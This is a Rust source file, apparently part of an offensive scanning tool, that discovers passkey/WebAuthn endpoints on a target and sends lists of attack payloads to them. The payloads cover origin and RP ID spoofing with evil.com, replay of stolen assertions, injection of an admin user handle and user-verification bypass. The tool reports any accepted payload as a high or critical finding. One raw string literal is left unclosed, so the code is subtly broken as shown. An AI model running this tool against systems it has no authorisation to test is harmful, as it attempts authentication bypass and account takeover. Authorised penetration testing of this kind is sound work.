use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const PASSKEY_ENDPOINTS: &[(&str, &str, &str)] = &[
    ("Registration begin", "/webauthn/register/begin", "POST"),
    ("Registration finish", "/webauthn/register/finish", "POST"),
    ("Auth begin", "/webauthn/auth/begin", "POST"),
    ("Auth finish", "/webauthn/auth/finish", "POST"),
    ("Credential list", "/webauthn/credentials", "GET"),
    ("Delete credential", "/webauthn/credentials/delete", "POST"),
    ("Rename credential", "/webauthn/credentials/rename", "POST"),
    ("Options", "/webauthn/options", "GET"),
];

const REGISTRATION_PAYLOADS: &[(&str, &str)] = &[
    ("Cross-device auth bypass", r#"{"attestation":"none","authenticatorSelection":{"authenticatorAttachment":"cross-platform","userVerification":"discouraged","residentKey":"required"},"extensions":{"credProps":true,"largeBlob":{"support":true}}}"#),
    ("Credential injection — no attestation", r#"{"attestation":"none","authenticatorSelection":{"userVerification":"discouraged"}}"#),
    ("Credential injection — weak RP ID", r#"{"publicKey":{"rpId":"evil.com","challenge":"AAAAAAAAAAAAAAAAAAAA","userId":"admin"}}"#),
    ("Origin bypass", r#"{"origin":"https://evil.com","type":"webauthn.create","challenge":"test"}"#),
    ("RP ID mismatch", r#"{"publicKey":{"rpId":"target.com.evil.com","challenge":"test"}}"#),
    ("User ID injection", r#"{"publicKey":{"user":{"id":"admin_user_id","name":"admin@target.com","displayName":"Admin"},"challenge":"test"}}"#),
    ("Resident key abuse", r#"{"authenticatorSelection":{"residentKey":"required","userVerification":"discouraged"},"extensions":{"credBlob":"attacker_data"}}"#),
    ("Large blob injection", r#"{"extensions":{"largeBlob":{"write":"base64_attacker_data"}}}"#),
    ("PRF extension abuse", r#"{"extensions":{"prf":{"eval":{"first":"base64_attacker_input"}}}}"#),
    ("Attestation bypass", r#"{"attestation":"direct","authenticatorSelection":{"userVerification":"discouraged"}}"#),
    ("UV bypass", r#"{"authenticatorSelection":{"userVerification":"discouraged"},"publicKey":{"userVerification":"discouraged"}}"#),
    ("Multi credential", r#"{"publicKey":{"excludeCredentials":[],"allowCredentials":[{"type":"public-key","id":"attacker_cred_id"}]}}"#),
];

const AUTH_PAYLOADS: &[(&str, &str)] = &[
    ("Assertion without challenge", r#"{"challenge":"","allowCredentials":[{"type":"public-key","id":"stolen_credential_id"}]}"#),
    ("Assertion replay", r#"{"id":"stolen_credential_id","rawId":"base64_stolen","response":{"authenticatorData":"base64_data","clientDataJSON":"base64_json","signature":"base64_sig","userHandle":"base64_admin"}}"),
    ("UV bypass on auth", r#"{"authenticatorSelection":{"userVerification":"discouraged"},"allowCredentials":[{"type":"public-key","id":"stolen"}]}"#),
    ("Cross-origin assertion", r#"{"origin":"https://evil.com","type":"webauthn.get","challenge":"test"}"#),
    ("Credential ID injection", r#"{"allowCredentials":[{"type":"public-key","id":"admin_credential_id","transports":["usb","nfc","ble","internal"]}]}"#),
    ("Empty user handle", r#"{"response":{"userHandle":""}}"#),
    ("Admin user handle", r#"{"response":{"userHandle":"YWRtaW5AdGFyZ2V0LmNvbQ=="}}"#),
    ("Backup eligibility bypass", r#"{"response":{"authenticatorData":"backup_eligible_true","backupState":true}}"#),
];

pub async fn abuse(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} Passkey/FIDO2 Registration Abuse", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let base = url.trim_end_matches('/');

    println!("\n{} [1/3] Passkey endpoint discovery...", "[*]".cyan().bold());
    let mut found = Vec::new();
    for (name, path, method) in PASSKEY_ENDPOINTS {
        let full_url = format!("{}{}", base, path);
        let req = if *method == "POST" {
            client.post(&full_url).header("Content-Type", "application/json")
        } else {
            client.get(&full_url)
        };
        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let accessible = status == 200 || status == 201;
                let tag = if accessible {
                    "ACCESSIBLE".green().bold().to_string()
                } else if status == 401 || status == 403 {
                    "auth".yellow().to_string()
                } else {
                    format!("status {}", status)
                };
                println!("  {} {:25} {:40} {}", "*".cyan(), name, path, tag);
                if accessible {
                    found.push((*name, body.chars().take(200).collect::<String>()));
                }
            }
            Err(_) => {
                println!("  {} {:25} {:40} error", "*".red(), name, path);
            }
        }
    }

    println!("\n{} [2/3] Registration abuse payloads...", "[*]".cyan().bold());
    let mut reg_results = Vec::new();
    for (name, payload) in REGISTRATION_PAYLOADS {
        let reg_url = format!("{}/webauthn/register/begin", base);
        match client.post(&reg_url)
            .header("Content-Type", "application/json")
            .body(payload.to_string())
            .send()
            .await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let has_challenge = body.contains("challenge") || body.contains("publicKey");
                let has_error = body.contains("error") || body.contains("invalid");
                let tag = if has_challenge && !has_error {
                    "CHALLENGE ISSUED".red().bold().to_string()
                } else if has_error {
                    "rejected".green().to_string()
                } else {
                    format!("status {}", status)
                };
                println!("  {} [{:02}] {:40} status={} {}", "*".cyan(), reg_results.len() + 1, name, status, tag);
                if has_challenge && !has_error {
                    println!("    {} {}", ">".red().bold(), body.chars().take(200).collect::<String>());
                    reg_results.push(*name);
                }
            }
            Err(_) => {
                println!("  {} [{:02}] {:40} error", "*".red(), reg_results.len() + 1, name);
            }
        }
    }

    println!("\n{} [3/3] Authentication abuse payloads...", "[*]".cyan().bold());
    let mut auth_results = Vec::new();
    for (name, payload) in AUTH_PAYLOADS {
        let auth_url = format!("{}/webauthn/auth/begin", base);
        match client.post(&auth_url)
            .header("Content-Type", "application/json")
            .body(payload.to_string())
            .send()
            .await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let has_challenge = body.contains("challenge") || body.contains("allowCredentials");
                let has_user = body.contains("user") || body.contains("email") || body.contains("admin");
                let has_error = body.contains("error") || body.contains("invalid");
                let tag = if (has_challenge || has_user) && !has_error {
                    "ACCEPTED".red().bold().to_string()
                } else if has_error {
                    "rejected".green().to_string()
                } else {
                    format!("status {}", status)
                };
                println!("  {} [{:02}] {:40} status={} {}", "*".cyan(), auth_results.len() + 1, name, status, tag);
                if (has_challenge || has_user) && !has_error {
                    println!("    {} {}", ">".red().bold(), body.chars().take(200).collect::<String>());
                    auth_results.push(*name);
                }
            }
            Err(_) => {
                println!("  {} [{:02}] {:40} error", "*".red(), auth_results.len() + 1, name);
            }
        }
    }

    println!(
        "\n{} {} endpoints found, {} reg payloads accepted, {} auth payloads accepted",
        "[*]".cyan().bold(),
        found.len(),
        reg_results.len(),
        auth_results.len()
    );

    if !reg_results.is_empty() {
        let cross_device = reg_results.iter().any(|n| n.contains("Cross"));
        let origin_bypass = reg_results.iter().any(|n| n.contains("Origin") || n.contains("RP ID"));
        let uv_bypass = reg_results.iter().any(|n| n.contains("UV") || n.contains("Attestation"));
        if cross_device {
            println!("{} [HIGH] Cross-device auth bypass — credential registration without physical device!", "[!]".red().bold());
        }
        if origin_bypass {
            println!("{} [CRITICAL] Origin/RP ID bypass — register credentials for arbitrary domains!", "[!]".red().bold());
        }
        if uv_bypass {
            println!("{} [MEDIUM] User verification bypass — weak authentication accepted!", "[!]".yellow().bold());
        }
    }
    if !auth_results.is_empty() {
        let replay = auth_results.iter().any(|n| n.contains("replay") || n.contains("Replay"));
        let admin = auth_results.iter().any(|n| n.contains("admin") || n.contains("Admin"));
        if replay {
            println!("{} [CRITICAL] Assertion replay accepted — stolen credentials work!", "[!]".red().bold());
        }
        if admin {
            println!("{} [CRITICAL] Admin user handle accepted — privilege escalation!", "[!]".red().bold());
        }
    }

    Ok(())
}
